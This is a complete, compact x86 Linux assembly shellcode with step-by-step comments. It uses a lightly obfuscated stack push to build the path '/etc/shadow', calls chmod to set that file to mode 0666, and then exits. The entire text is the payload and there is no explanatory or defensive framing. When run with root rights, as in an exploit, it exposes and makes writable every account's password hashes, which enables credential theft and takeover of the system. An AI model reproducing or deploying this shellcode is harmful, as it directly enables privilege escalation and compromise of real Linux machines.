global _start

section .text

_start:
    ; int chmod(const char *pathname, mode_t mode): syscall 0xf
    ;   chmod("/etc/shadow", 0666)
    push byte 0x77      ; "w"
    push word 0x6f64    ; "do" reversed
    mov eax, 0x6168732f
    push eax            ; "/sha" reversed
    xor eax, 0x21C1601
    inc eax
    push eax            ; "/etc" reversed
    mov ebx, esp        ; ebx = "/etc/shadow"
    and eax, 0xf        ; eax = 0xf
    push word 0x1b6
    pop ecx             ; ecx = 0x652f[01b6] = 0666
    int 0x80            ; perform syscall
    
    ; void _exit(int status): syscall 0x1
    ;   _exit(whatever)
    inc eax             ; eax = 1
    int 0x80            ; perform syscall

